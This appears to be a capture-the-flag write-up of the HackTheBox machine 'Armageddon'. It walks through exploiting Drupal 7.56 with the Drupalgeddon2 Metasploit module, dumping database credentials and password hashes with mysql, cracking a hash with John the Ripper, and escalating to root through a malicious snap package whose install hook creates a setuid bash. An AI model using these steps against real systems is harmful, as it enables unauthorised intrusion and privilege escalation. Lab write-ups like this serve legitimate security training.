---
title: "HackTheBox - Armageddon"
author: Nasrallah
description: ""
date: 2023-02-05 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, rce, cve]
img_path: /assets/img/hackthebox/machines/armageddon
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Armageddon](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.10.233
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
```

We have OpenSSH running on port 22 and an Apache web server with Drupal on port 80.

We also see there is a robots.txt with a total of 36 disallowed entries.

## Web

Let's navigate to the web page.

![](1.png)

We have a login page and no credentials.

Let's check the /CHANGELOG.txt

![](2.png)

Here we see the version of Drupal is 7.56, let's search on exploit-db to see if this version is vulnerable.

![](3.png)

This Drupal is vulnerable to remote code execution.


# **Foothold**

Using the metasploit `exploit/unix/webapp/drupal_drupalgeddon2` module, let's exploit the service.

![](4.png)

Great! We got the shell.

# **Privilege Escalation**

Let's check the settings.php file where database credentials are stored.

![](5.png)

We find mysql credentials, let's connect to it.

```terminal
bash-4.2$ mysql -u drupaluser --password=CQHEy@9M*m23gBVj -e 'show databases;'
<er --password=CQHEy@9M*m23gBVj -e 'show databases;'                         
Database              
information_schema   
drupal             
mysql                      
performance_schema        
bash-4.2$ mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'show tables;'
<er --password=CQHEy@9M*m23gBVj -D drupal -e 'show tables;'                  
Tables_in_drupal   
actions  
authmap      
.
.
.
users
users_roles
variable
watchdog
bash-4.2$ mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
<er --password=CQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'  
name    pass

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

```

We got `brucetherealadmin`'s hash, let's crack it.

```bash
──╼ $ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:02 DONE (2023-01-26 09:28) 0.3891g/s 90.27p/s 90.27c/s 90.27C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

We got the password, now let's ssh to the machine.

![](6.png)

Now we run sudo -l

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

We can run snap install as root.

Checking this entry on GTFOBins, we find that we can run the following command to get root.

```bash
COMMAND='cp /bin/bash /home/hacked && chmod +s /home/hacked'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```


```bash
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```

fpm is not installed on the target machine, so we'll execute the first part on our machine then upload the snap file to our target and execute the second part command.

First we install npm with `sudo gem install --no-document fpm`.

Now let's get root.

![](7.png)


![](8.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).